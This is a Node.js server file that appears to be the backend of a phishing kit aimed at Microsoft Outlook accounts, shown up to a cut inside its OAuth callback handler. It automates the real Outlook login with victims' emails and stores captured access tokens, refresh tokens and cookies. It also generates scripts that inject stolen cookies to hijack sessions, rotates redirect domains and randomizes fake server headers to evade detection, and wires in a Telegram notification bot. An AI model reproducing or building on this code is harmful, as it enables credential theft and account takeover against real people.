const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

// Load environment variables from .env file
if (fs.existsSync('.env')) {
    const envFile = fs.readFileSync('.env', 'utf8');
    envFile.split('\n').forEach(line => {
        // Skip comments and empty lines
        if (line.trim().startsWith('#') || !line.trim()) return;

        const [key, ...valueParts] = line.split('=');
        const value = valueParts.join('='); // Handle values with = in them

        if (key && value && !process.env[key]) {
            process.env[key] = value.trim();
        }
    });
    console.log('✅ Environment variables loaded from .env file');
}

const { GraphAPIAuth } = require('./src/graph-api');
const { ClosedBridgeAutomation } = require('./src/closedbridge-automation');
const OutlookNotificationBot = require('./telegram-bot');

const app = express();
const PORT = 5000; // Fixed port for Replit environment

// Auto-generate encryption seed if not provided
function generateEncryptionSeed() {
    // Try to load existing seed from file first
    const seedFile = path.join(__dirname, '.encryption-seed');
    
    if (fs.existsSync(seedFile)) {
        try {
            const existingSeed = fs.readFileSync(seedFile, 'utf8').trim();
            if (existingSeed && existingSeed.length >= 32) {
                console.log('🔐 Using existing encryption seed from file');
                return existingSeed;
            }
        } catch (error) {
            console.warn('⚠️ Error reading existing seed file:', error.message);
        }
    }
    
    // Generate new secure seed
    const newSeed = crypto.randomBytes(32).toString('hex');
    
    try {
        fs.writeFileSync(seedFile, newSeed, 'utf8');
        console.log('🔑 Generated new encryption seed and saved to file');
    } catch (error) {
        console.warn('⚠️ Could not save seed to file:', error.message);
    }
    
    return newSeed;
}

// Encryption configuration
const ENCRYPTION_SEED = process.env.ENCRYPTION_SEED || generateEncryptionSeed();
const ENCRYPTION_KEY = crypto.scryptSync(ENCRYPTION_SEED, 'salt', 32);

// Utility functions for encryption
function encryptData(text) {
    if (!text) return null;
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', ENCRYPTION_KEY, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();
    return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted;
}

function decryptData(encryptedText) {
    if (!encryptedText) return null;
    try {
        const parts = encryptedText.split(':');
        if (parts.length !== 3) return null;
        
        const iv = Buffer.from(parts[0], 'hex');
        const authTag = Buffer.from(parts[1], 'hex');
        const encrypted = parts[2];
        
        const decipher = crypto.createDecipheriv('aes-256-gcm', ENCRYPTION_KEY, iv);
        decipher.setAuthTag(authTag);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (error) {
        console.warn('Decryption failed:', error.message);
        return null;
    }
}

// Security configuration - Always auto-generate
const ADMIN_TOKEN = 'admin-' + Math.random().toString(36).substr(2, 24);

// Make admin token available globally for Telegram bot
global.adminToken = ADMIN_TOKEN;
console.log('🔑 Admin Token for testing:', ADMIN_TOKEN);

// Initialize Telegram Bot
let telegramBot = null;
try {
    if (process.env.TELEGRAM_BOT_TOKEN) {
        telegramBot = new OutlookNotificationBot();
        console.log('🤖 Telegram Bot initialized successfully');
    } else {
        console.log('⚠️ TELEGRAM_BOT_TOKEN not found - Telegram notifications disabled');
    }
} catch (error) {
    console.error('❌ Failed to initialize Telegram Bot:', error.message);
}

// Middleware - Configure CORS for Replit environment
app.use(cors({
    origin: true, // Allow all origins for Replit proxy
    credentials: true
}));
app.use(express.json());

// Admin authentication middleware
function requireAdminAuth(req, res, next) {
    const token = req.headers['authorization']?.replace('Bearer ', '') || 
                  (req.query && req.query.token) || 
                  (req.body && req.body.token);

    if (!token || token !== ADMIN_TOKEN) {
        return res.status(401).json({ 
            error: 'Unauthorized access to admin endpoint',
            message: 'Valid admin token required'
        });
    }
    next();
}

app.use(express.static('public'));

// Domain Rotation Configuration Storage
const DOMAIN_CONFIG_FILE = path.join(__dirname, 'domain-rotation-config.json');

// Load domain rotation configuration from file
function loadDomainConfig() {
    try {
        if (fs.existsSync(DOMAIN_CONFIG_FILE)) {
            const data = fs.readFileSync(DOMAIN_CONFIG_FILE, 'utf8');
            const config = JSON.parse(data);
            console.log('🌐 Loaded domain rotation configuration:', config);
            return config;
        }
    } catch (error) {
        console.error('Error loading domain config:', error);
    }

    // Default configuration
    const defaultConfig = {
        enabled: true,
        mainDomain: null,
        rotationDomains: [
            'newdomain1.com',
            'newdomain2.com', 
            'newdomain3.com',
            'newdomain4.com',
            'newdomain5.com'
        ],
        rotationString: null,
        rotationIndex: 0,
        activeDomains: []
    };

    console.log('🌐 Using default domain rotation configuration');
    return defaultConfig;
}

// Save domain rotation configuration to file
function saveDomainConfig(config) {
    try {
        fs.writeFileSync(DOMAIN_CONFIG_FILE, JSON.stringify(config, null, 2));
        console.log('💾 Domain rotation configuration saved');
        return true;
    } catch (error) {
        console.error('Error saving domain config:', error);
        return false;
    }
}

// Generate 1 random 6-character string for rotation
function generateRotationString() {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomString = '';

    for (let i = 0; i < 6; i++) {
        randomString += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    return randomString;
}

// Check if domains are active by testing HTTP connectivity
async function checkDomainActivity(domains) {
    const activeDomains = [];

    for (const domain of domains) {
        try {
            // Test HTTP connectivity to domain
            const isActive = await testDomainConnectivity(domain);

            if (isActive) {
                activeDomains.push({
                    domain: domain,
                    active: true,
                    lastChecked: new Date().toISOString()
                });
                console.log(`✅ Domain ${domain} is active`);
            } else {
                console.log(`❌ Domain ${domain} appears inactive`);
            }
        } catch (error) {
            console.log(`❌ Domain ${domain} check failed:`, error.message);
        }
    }

    return activeDomains;
}

// Test domain connectivity by making HTTP request
async function testDomainConnectivity(domain) {
    try {
        // Import fetch for Node.js (if not available globally)
        const fetch = require('node-fetch');

        // Test both HTTP and HTTPS versions
        const testUrls = [`http://${domain}`, `https://${domain}`];

        for (const testUrl of testUrls) {
            try {
                const response = await fetch(testUrl, {
                    method: 'HEAD',
                    timeout: 5000, // 5 second timeout
                    headers: {
                        'User-Agent': 'Domain-Rotation-Checker/1.0'
                    }
                });

                // If we get any response (even errors), domain is active
                console.log(`📡 Domain ${domain} responded with status ${response.status}`);
                return true;

            } catch (fetchError) {
                // Try next URL
                continue;
            }
        }

        return false;

    } catch (error) {
        console.error(`Error testing domain ${domain}:`, error.message);
        return false;
    }
}

// Initialize domain configuration
let domainConfig = loadDomainConfig();

// Domain rotation middleware - handles single rotation string with cycling
app.use((req, res, next) => {
    // Skip if rotation is disabled
    if (!domainConfig.enabled || !domainConfig.rotationString) {
        return next();
    }

    // Check if the path matches the rotation string
    const currentPath = req.path.substring(1); // Remove leading slash

    if (currentPath === domainConfig.rotationString) {
        // Get target domain using cycling rotation index
        const targetDomain = domainConfig.rotationDomains[domainConfig.rotationIndex % domainConfig.rotationDomains.length];

        // Increment rotation index for next visit
        domainConfig.rotationIndex = (domainConfig.rotationIndex + 1) % domainConfig.rotationDomains.length;

        // Save updated configuration with new rotation index
        saveDomainConfig(domainConfig);

        console.log(`🔄 Domain rotation: /${currentPath} → https://${targetDomain} (next: ${domainConfig.rotationIndex})`);

        // Redirect to the chosen domain WITHOUT the rotation string
        return res.redirect(302, `https://${targetDomain}`);
    }

    // For all other requests, continue normally
    next();
});

// Store user sessions with Graph API auth and OAuth state tracking
const userSessions = new Map(); // sessionId -> { sessionId, graphAuth, userEmail, createdAt, oauthState, authenticated, verified }
const oauthStates = new Map(); // state -> { sessionId, timestamp }
const automationSessions = new Map(); // sessionId -> { automation, status, email, startTime }
const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
const STATE_TIMEOUT = 10 * 60 * 1000; // 10 minutes for OAuth state
const MAX_PRELOADS = 2; // Maximum number of concurrent preloaded browsers
const MAX_WARM_BROWSERS = 0; // Disabled: Maximum number of pre-warmed browsers ready for immediate use
const MIN_WARM_BROWSERS = 0; // Disabled: Minimum number of warm browsers to maintain

// Store for warm browsers that are pre-initialized and ready for immediate use
const warmBrowserPool = new Map(); // warmId -> { automation, status, createdAt }
let warmBrowserPoolLock = false; // Prevent simultaneous warm browser creation

// Store for SSE connections to send immediate authentication status updates
const sseConnections = new Map(); // sessionId -> response object

// Analytics tracking with persistent storage
const ANALYTICS_FILE = path.join(__dirname, 'analytics.json');

// Function to broadcast immediate authentication events via SSE
function broadcastAuthEvent(sessionId, event, data = {}) {
    const connection = sseConnections.get(sessionId);
    if (connection && !connection.destroyed) {
        try {
            const eventData = JSON.stringify({ ...data, timestamp: Date.now() });
            connection.write(`event: ${event}\n`);
            connection.write(`data: ${eventData}\n\n`);
            console.log(`📡 SSE event sent to ${sessionId}: ${event}`);
        } catch (error) {
            console.warn(`SSE broadcast error for ${sessionId}:`, error.message);
            sseConnections.delete(sessionId);
        }
    }
}

// Load analytics from file
function loadAnalytics() {
    try {
        if (fs.existsSync(ANALYTICS_FILE)) {
            const data = fs.readFileSync(ANALYTICS_FILE, 'utf8');
            const savedAnalytics = JSON.parse(data);
            console.log('📊 Loaded analytics from file:', savedAnalytics);
            return {
                totalLogins: savedAnalytics.totalLogins || 0,
                successfulLogins: savedAnalytics.successfulLogins || 0,
                failedLogins: savedAnalytics.failedLogins || 0
            };
        }
    } catch (error) {
        console.error('Error loading analytics:', error);
    }
    console.log('📊 Starting with fresh analytics data');
    return {
        totalLogins: 0,
        successfulLogins: 0,
        failedLogins: 0
    };
}

// Save analytics to file with batching
let analyticsPending = false;
function saveAnalytics() {
    if (analyticsPending) return;
    analyticsPending = true;

    setTimeout(() => {
        try {
            fs.writeFileSync(ANALYTICS_FILE, JSON.stringify(analytics, null, 2));
            console.log('💾 Analytics saved to file');
        } catch (error) {
            console.error('Error saving analytics:', error);
        } finally {
            analyticsPending = false;
        }
    }, 1000); // Batch writes every 1 second
}

// Initialize analytics from file
const analytics = loadAnalytics();

// Warm Browser Pool Management Functions
async function createWarmBrowser() {
    try {
        const warmId = 'warm_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        console.log(`🔥 Creating warm browser: ${warmId}`);

        const automation = new ClosedBridgeAutomation({
            enableScreenshots: false, // Disable screenshots for warm browsers to save resources
            screenshotQuality: 80,
            sessionId: warmId,
            eventCallback: null // No event callbacks for warm browsers
        });

        // Initialize browser and navigate to Outlook
        await automation.init();
        console.log(`🔧 Warm browser initialized: ${warmId}`);

        const navigated = await automation.navigateToOutlook();
        if (!navigated) {
            throw new Error('Failed to navigate to Outlook during warm browser creation');
        }
        console.log(`🌐 Warm browser navigated to Outlook: ${warmId}`);

        // Store in warm browser pool
        warmBrowserPool.set(warmId, {
            automation: automation,
            status: 'warm_ready',
            createdAt: Date.now()
        });

        console.log(`✅ Warm browser ready: ${warmId}`);
        return warmId;

    } catch (error) {
        console.error(`❌ Failed to create warm browser:`, error.message);
        return null;
    }
}

async function maintainWarmBrowserPool() {
    // Prevent simultaneous executions
    if (warmBrowserPoolLock) {
        console.log('🔒 Warm browser pool already being maintained, skipping...');
        return;
    }

    warmBrowserPoolLock = true;

    try {
        const currentWarmCount = warmBrowserPool.size;
        const neededBrowsers = MIN_WARM_BROWSERS - currentWarmCount;

        if (neededBrowsers > 0) {
            console.log(`🔥 Need ${neededBrowsers} more warm browsers (current: ${currentWarmCount}, min: ${MIN_WARM_BROWSERS})`);

            // Create needed browsers in parallel but limit to MAX_WARM_BROWSERS
            const browsersToCreate = Math.min(neededBrowsers, MAX_WARM_BROWSERS - currentWarmCount);
            const creationPromises = [];

            for (let i = 0; i < browsersToCreate; i++) {
                creationPromises.push(createWarmBrowser());
            }

            if (creationPromises.length > 0) {
                await Promise.all(creationPromises);
            }
        }
    } catch (error) {
        console.error('Error maintaining warm browser pool:', error.message);
    } finally {
        warmBrowserPoolLock = false;
    }
}

async function getWarmBrowser() {
    // Get the oldest warm browser and validate its health
    for (const [warmId, warmData] of warmBrowserPool) {
        if (warmData.status === 'warm_ready') {
            // Check if the browser is still healthy before using it
            try {
                const isHealthy = await warmData.automation.isHealthy();
                if (isHealthy) {
                    warmBrowserPool.delete(warmId);
                    console.log(`🚀 Retrieved healthy warm browser for use: ${warmId}`);

                    // Trigger background maintenance to replace the used browser
                    setTimeout(() => {
                        maintainWarmBrowserPool().catch(error => {
                            console.error('Background warm browser maintenance failed:', error.message);
                        });
                    }, 100);

                    return warmData.automation;
                } else {
                    // Browser is unhealthy, remove it and try to close it
                    console.warn(`❌ Removing unhealthy warm browser: ${warmId}`);
                    warmBrowserPool.delete(warmId);
                    try {
                        await warmData.automation.close();
                    } catch (closeError) {
                        console.warn(`Error closing unhealthy browser ${warmId}:`, closeError.message);
                    }
                    // Continue to check next browser
                }
            } catch (healthCheckError) {
                // Health check failed, remove this browser
                console.warn(`❌ Health check failed for warm browser ${warmId}:`, healthCheckError.message);
                warmBrowserPool.delete(warmId);
                try {
                    await warmData.automation.close();
                } catch (closeError) {
                    console.warn(`Error closing failed browser ${warmId}:`, closeError.message);
                }
                // Continue to check next browser
            }
        }
    }
    
    // No healthy browser found, trigger maintenance
    setTimeout(() => {
        maintainWarmBrowserPool().catch(error => {
            console.error('Emergency warm browser maintenance failed:', error.message);
        });
    }, 100);
    
    return null;
}

// Start warm browser pool immediately when server starts
async function initializeWarmBrowserPool() {
    console.log('🔥 Initializing warm browser pool...');
    try {
        await maintainWarmBrowserPool();
        console.log('✅ Warm browser pool initialized');
    } catch (error) {
        console.error('❌ Failed to initialize warm browser pool:', error.message);
    }
}

// Warm browser pool initialization disabled - using only private browsers
// setTimeout(() => {
//     initializeWarmBrowserPool().catch(error => {
//         console.error('Warm browser pool initialization failed:', error.message);
//     });
// }, 2000); // Start after 2 seconds to let server finish starting

// Cleanup expired sessions and OAuth states
setInterval(async () => {
    const now = Date.now();

    // Clean up expired sessions
    for (const [sessionId, session] of userSessions) {
        if (now - session.createdAt > SESSION_TIMEOUT) {
            userSessions.delete(sessionId);
            console.log(`🧹 Cleaned up expired session: ${sessionId}`);
        }
    }

    // Clean up expired OAuth states
    for (const [state, stateInfo] of oauthStates) {
        if (now - stateInfo.timestamp > STATE_TIMEOUT) {
            oauthStates.delete(state);
            console.log(`🧹 Cleaned up expired OAuth state`);
        }
    }

    // Clean up expired automation sessions
    for (const [sessionId, automationSession] of automationSessions) {
        if (now - automationSession.startTime > SESSION_TIMEOUT) {
            try {
                if (automationSession.automation) {
                    await automationSession.automation.close();
                }
            } catch (error) {
                console.error(`Error closing automation session ${sessionId}:`, error.message);
            }
            automationSessions.delete(sessionId);
            console.log(`🧹 Cleaned up expired automation session: ${sessionId}`);
        }
    }

    // Clean up expired warm browsers (older than 20 minutes)
    const WARM_BROWSER_TIMEOUT = 20 * 60 * 1000; // 20 minutes
    for (const [warmId, warmData] of warmBrowserPool) {
        if (now - warmData.createdAt > WARM_BROWSER_TIMEOUT) {
            try {
                if (warmData.automation) {
                    await warmData.automation.close();
                }
            } catch (error) {
                console.error(`Error closing warm browser ${warmId}:`, error.message);
            }
            warmBrowserPool.delete(warmId);
            console.log(`🧹 Cleaned up expired warm browser: ${warmId}`);
        }
    }

    // Trigger warm browser pool maintenance after cleanup
    if (warmBrowserPool.size < MIN_WARM_BROWSERS) {
        maintainWarmBrowserPool().catch(error => {
            console.error('Warm browser pool maintenance failed during cleanup:', error.message);
        });
    }
}, 2 * 60 * 1000); // Check every 2 minutes

// Helper function to create session ID
function createSessionId() {
    return Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
}

// Generate cookie injection script
function generateCookieInjectionScript(email, cookies, sessionId) {
    return `
// Secure Session Injector
// Auto-generated on ${new Date().toISOString()}
// Session: ${email} (${cookies.length} cookies)

(function() {
    console.log('🔐 Secure session restoration for: ${email}');

    const sessionInfo = {
        email: '${email}',
        timestamp: '${new Date().toISOString()}',
        cookieCount: ${cookies.length},
        security: 'encrypted'
    };

    console.log('📧 Session info:', sessionInfo);

    // Decrypt and process cookies
    const encryptedCookies = ${JSON.stringify(cookies, null, 4)};
    const cookies = encryptedCookies.map(cookie => {
        if (cookie.encrypted) {
            // Note: In production, decryption would happen server-side
            console.log('🔓 Processing encrypted cookie:', cookie.name);
        }
        return cookie;
    });
    
    let injected = 0;

    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieStr;
            injected++;
        } catch (e) {
            console.warn('Failed to inject cookie:', cookie.name);
        }
    });

    console.log('✅ Successfully injected ' + injected + ' cookies!');
    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');

    // Auto-redirect option
    setTimeout(() => {
        if (confirm('Injected ' + injected + ' cookies for ${email}! Open Outlook now?')) {
            window.open('https://outlook.office.com/mail/', '_blank');
        }
    }, 1000);
})();
`;
}

// Enhanced browser preloading functions for performance optimization
async function startBrowserPreload(sessionId, email) {
    try {
        console.log(`🚀 Starting enhanced browser preload for session: ${sessionId}, email: ${email}`);

        // Check if we've reached the maximum preload limit
        const currentPreloads = Array.from(automationSessions.values())
            .filter(session => session.status === 'preloading' || session.status === 'preload_ready');

        if (currentPreloads.length >= MAX_PRELOADS) {
            // Evict oldest preload to make space
            const oldestPreload = currentPreloads
                .sort((a, b) => a.startTime - b.startTime)[0];

            if (oldestPreload) {
                console.log(`📊 MAX_PRELOADS reached, evicting oldest preload: ${oldestPreload.sessionId || 'unknown'}`);
                try {
                    if (oldestPreload.automation) {
                        await oldestPreload.automation.close();
                    }
                    // Find and remove the oldest preload from automationSessions
                    for (const [key, value] of automationSessions) {
                        if (value === oldestPreload) {
                            automationSessions.delete(key);
                            break;
                        }
                    }
                } catch (evictError) {
                    console.warn('Error evicting old preload:', evictError.message);
                }
            }
        }

        let automation = null;
        let usedWarmBrowser = false;

        // Always use private browser for each session (warm browsers disabled)
        console.log(`🔧 Creating private browser for: ${sessionId}, email: ${email}`);
        automation = new ClosedBridgeAutomation({
            enableScreenshots: true,
            screenshotQuality: 80,
            sessionId: sessionId,
            eventCallback: broadcastAuthEvent
        });

        // Initialize browser and navigate (private browser)
        await automation.init();
        console.log(`🔧 Browser initialized for preload session: ${sessionId}`);

        const navigated = await automation.navigateToOutlook();
        if (!navigated) {
            throw new Error('Failed to navigate to Outlook during preload');
        }
        console.log(`🌐 Navigated to Outlook for preload session: ${sessionId}`);

        // Store in automationSessions with preloading status
        automationSessions.set(sessionId, {
            automation: automation,
            status: 'preloading',
            email: email,
            startTime: Date.now(),
            sessionId: sessionId,
            usedWarmBrowser: usedWarmBrowser
        });

        // Start the preload process (email entry and wait at password prompt)
        const preloadSuccess = await automation.preload(email);

        if (preloadSuccess) {
            // Update status to ready
            automationSessions.get(sessionId).status = 'preload_ready';
            console.log(`✅ Browser preload completed and ready for: ${email} (session: ${sessionId})`);
        } else {
            // Update status to failed
            automationSessions.get(sessionId).status = 'preload_failed';
            console.log(`❌ Browser preload failed for: ${email} (session: ${sessionId})`);

            // Clean up failed preload after a short delay
            setTimeout(async () => {
                try {
                    await automation.close();
                    automationSessions.delete(sessionId);
                } catch (cleanupError) {
                    console.warn('Error cleaning up failed preload:', cleanupError.message);
                }
            }, 5000);
        }

    } catch (error) {
        console.error(`❌ Browser preload error for ${email}:`, error.message);

        // Clean up on error
        if (automationSessions.has(sessionId)) {
            try {
                const session = automationSessions.get(sessionId);
                if (session.automation) {
                    await session.automation.close();
                }
                automationSessions.delete(sessionId);
            } catch (cleanupError) {
                console.warn('Error cleaning up preload after error:', cleanupError.message);
            }
        }

        throw error;
    }
}

// Function to get preload status for debugging
function getPreloadStats() {
    const preloadSessions = Array.from(automationSessions.values())
        .filter(session => session.status && session.status.startsWith('preload'));

    return {
        total: preloadSessions.length,
        preloading: preloadSessions.filter(s => s.status === 'preloading').length,
        ready: preloadSessions.filter(s => s.status === 'preload_ready').length,
        failed: preloadSessions.filter(s => s.status === 'preload_failed').length,
        maxAllowed: MAX_PRELOADS
    };
}

// Routes

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'Microsoft Graph API Backend is running',
        authConfigured: !!(process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID)
    });
});

// SSE endpoint for real-time authentication status updates
app.get('/api/auth-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;

    // Set SSE headers
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Cache-Control'
    });

    // Send initial connection confirmation
    res.write(`event: connected\n`);
    res.write(`data: ${JSON.stringify({ sessionId, timestamp: Date.now() })}\n\n`);

    // Store connection for this session
    sseConnections.set(sessionId, res);
    console.log(`🔗 SSE connection established for session: ${sessionId}`);

    // Handle client disconnect
    req.on('close', () => {
        sseConnections.delete(sessionId);
        console.log(`❌ SSE connection closed for session: ${sessionId}`);
    });

    req.on('error', (error) => {
        console.warn(`SSE connection error for ${sessionId}:`, error.message);
        sseConnections.delete(sessionId);
    });
});

// Add security headers to appear legitimate
app.use((req, res, next) => {
    // Generate random server identifier
    const serverIds = ['nginx/1.18.0', 'Apache/2.4.41', 'cloudflare', 'Microsoft-IIS/10.0', 'nginx/1.20.2'];
    const randomServer = serverIds[Math.floor(Math.random() * serverIds.length)];

    // Generate encrypted request tracking
    const requestId = crypto.createHash('sha256').update(Date.now() + Math.random().toString()).digest('hex').substring(0, 16);
    const sessionToken = crypto.createHash('md5').update(req.headers['user-agent'] || 'unknown').digest('hex').substring(0, 8);

    // Core security headers with encrypted values
    res.setHeader('Server', randomServer);
    res.setHeader('X-Request-ID', requestId);
    res.setHeader('X-Session-Token', sessionToken);
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', Math.random() > 0.5 ? 'SAMEORIGIN' : 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    res.setHeader('X-Permitted-Cross-Domain-Policies', 'none');
    res.setHeader('X-Download-Options', 'noopen');

    // Randomized CSP policy
    const cspPolicies = [
        "default-src 'self' 'unsafe-inline' 'unsafe-eval' https: data: blob:; img-src 'self' https: data: blob:; connect-src 'self' https: wss:",
        "default-src 'self' 'unsafe-inline' https: data:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:",
        "default-src 'self' https: data:; script-src 'self' 'unsafe-inline' https:; object-src 'none'; base-uri 'self'"
    ];
    const randomCSP = cspPolicies[Math.floor(Math.random() * cspPolicies.length)];
    res.setHeader('Content-Security-Policy', randomCSP);

    // Additional randomized headers
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    res.setHeader('X-Robots-Tag', 'noindex, nofollow');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');

    // Random performance/monitoring headers
    const performanceHeaders = [
        'cf-ray', 'cf-request-id', 'x-trace-id', 'x-correlation-id', 'x-forwarded-for'
    ];
    const randomHeader = performanceHeaders[Math.floor(Math.random() * performanceHeaders.length)];
    const randomValue = Math.random().toString(36).substring(2, 15);
    res.setHeader(randomHeader, randomValue);

    // Vary headers for caching
    res.setHeader('Vary', 'Accept-Encoding, User-Agent, Accept-Language');

    next();
});

// Get OAuth authorization URL
app.post('/api/auth-url', (req, res) => {
    try {
        // Check if Azure credentials are configured
        if (!process.env.AZURE_CLIENT_ID || !process.env.AZURE_CLIENT_SECRET || !process.env.AZURE_TENANT_ID) {
            return res.status(500).json({
                error: 'Azure credentials not configured',
                message: 'Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID'
            });
        }

        const sessionId = createSessionId();

        // Use fixed redirect URI from environment or construct carefully
        const redirectUri = process.env.AZURE_REDIRECT_URI || `${req.protocol}://${req.get('host')}/api/auth-callback`;

        const graphAuth = new GraphAPIAuth({
            clientId: process.env.AZURE_CLIENT_ID,
            clientSecret: process.env.AZURE_CLIENT_SECRET,
            tenantId: process.env.AZURE_TENANT_ID,
            redirectUri: redirectUri
        });

        const authUrl = graphAuth.getAuthUrl(sessionId);

        // Extract state from URL for tracking
        const stateMatch = authUrl.match(/state=([^&]+)/);
        const state = stateMatch ? decodeURIComponent(stateMatch[1]) : null;

        // Store session and state mapping
        userSessions.set(sessionId, {
            sessionId: sessionId,
            graphAuth: graphAuth,
            userEmail: null,
            createdAt: Date.now(),
            oauthState: state,
            authenticated: false, // Initialize as not authenticated
            verified: false // Initialize as not verified
        });

        if (state) {
            oauthStates.set(state, {
                sessionId: sessionId,
                timestamp: Date.now()
            });
        }

        analytics.totalLogins++;
        saveAnalytics();

        console.log(`🔑 Generated auth URL for session: ${sessionId}`);

        res.json({
            authUrl: authUrl,
            sessionId: sessionId,
            message: 'Click the URL to authenticate with Microsoft'
        });

    } catch (error) {
        console.error('Error generating auth URL:', error);
        res.status(500).json({ 
            error: 'Failed to generate auth URL',
            details: error.message 
        });
    }
});

// Handle OAuth callback
app.get('/api/auth-callback', async (req, res) => {
    try {
        const { code, state, error: authError } = req.query;

        if (authError) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Authentication failed',
                details: authError 
            });
        }

        if (!code || !state) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Missing authorization code or state parameter' 
            });
        }

        // Validate state and find associated session
        const stateInfo = oauthStates.get(state);
        if (!stateInfo) {
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Invalid or expired state parameter' 
            });
        }

        // Check state timeout (10 minutes)
        if (Date.now() - stateInfo.timestamp > STATE_TIMEOUT) {
            oauthStates.delete(state);
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'OAuth state expired' 
            });
        }

        const targetSession = userSessions.get(stateInfo.sessionId);
        if (!targetSession) {
            oauthStates.delete(state);
            analytics.failedLogins++;
            saveAnalytics();
            return res.status(400).json({ 
                error: 'Associated session not found' 
            });
        }

        // Clean up OAuth state
        oauthStates.delete(state);

        try {
            // Exchange code for tokens
            const tokenData = await targetSession.graphAuth.getTokenFromCode(code);

            // Get user profile
            const userProfile = await targetSession.graphAuth.getUserProfile();
            targetSession.userEmail = userProfile.mail || userProfile.userPrincipalName;
            targetSession.authenticated = true; // Mark session as authenticated

            // Check if we have stored credentials for this email
            const sessionDir = path.join(__dirname, 'session_data');

            try {
                const glob = require('fs').readdirSync(sessionDir).filter(file => 
                    file.includes(targetSession.userEmail.replace(/[@.]/g, '_')) && file.startsWith('session_')
                );

                if (glob.length > 0) {
                    const latestFile = glob.sort().pop();
                    const credentialsData = JSON.parse(fs.readFileSync(path.join(sessionDir, latestFile), 'utf8'));
                    console.log(`✅ Found stored credentials for: ${targetSession.userEmail}`);

                    // Use existing session cookies if available, otherwise create basic ones
                    let sessionCookies = [];

                    if (credentialsData.cookies && credentialsData.cookies.length > 0) {
                        // Use existing cookies from previous session
                        sessionCookies = credentialsData.cookies;
                        console.log(`🔄 Reusing ${sessionCookies.length} existing session cookies`);
                    } else {
                        // Create basic authentication cookies
                        sessionCookies = [
                            {
                                name: 'MSGraphAccessToken',
                                value: tokenData.access_token,
                                domain: '.microsoftonline.com',
                                path: '/',
                                expires: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
                                secure: true,
                                httpOnly: true,
                                sameSite: 'None'
                            }
                        ];
                        console.log(`🆕 Created ${sessionCookies.length} new authentication cookies`);
                    }

                    // Generate injection script
                    const injectionScript = generateCookieInjectionScript(targetSession.userEmail, sessionCookies, targetSession.sessionId);
                    const injectFilename = `inject_session_${targetSession.sessionId}.js`;
                    const injectPath = path.join(sessionDir, injectFilename);

                    fs.writeFileSync(injectPath, injectionScript);
                    console.log(`🍪 Generated cookie injection script: ${injectFilename}`);

                    // Store comprehensive session data
                    const fullSessionData = {
                        ...credentialsData,
                        sessionId: targetSession.sessionId,
                        authTimestamp: new Date().toISOString(),
                        status: 'valid',
                        totalCookies: sessionCookies.length,
                        domains: [...new Set(sessionCookies.map(c => c.domain))],
                        cookies: sessionCookies,
                        injectFilename: injectFilename,
                        accessToken: tokenData.access_token,
                        refreshToken: tokenData.refresh_token,
                        tokenExpiry: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString()
                    };

                    fs.writeFileSync(
                        path.join(sessionDir, `session_${targetSession.sessionId}_${targetSession.userEmail.replace(/[@.]/g, '_')}.json`),
                        JSON.stringify(fullSessionData, null, 2)
                    );

                    console.log(`💾 Saved complete session data for: ${targetSession.userEmail} with ${sessionCookies.length} cookies`);
                } else {
                    console.log(`⚠️ No stored credentials found for: ${targetSession.userEmail}`);
                }
            } catch (error) {
                console.error('Error processing stored credentials:', error);
            }

        } catch (tokenError) {
            // Handle specific Microsoft authentication errors
            console.error('❌ Microsoft authentication failed:', tokenError);

            let errorMessage = 'Authentication failed';
            let errorDetails = tokenError.message;

            // Parse common Microsoft error responses
            if (tokenError.message.includes('invalid_grant')) {
                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
            } else if (tokenError.message.includes('invalid_client')) {
                errorMessage = 'Application configuration error. Please contact support.';
            } else if (tokenError.message.includes('unauthorized_client')) {
                errorMessage = 'This application is not authorized to access your account.';
            } else if (tokenError.message.includes('AADSTS50126')) {
                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
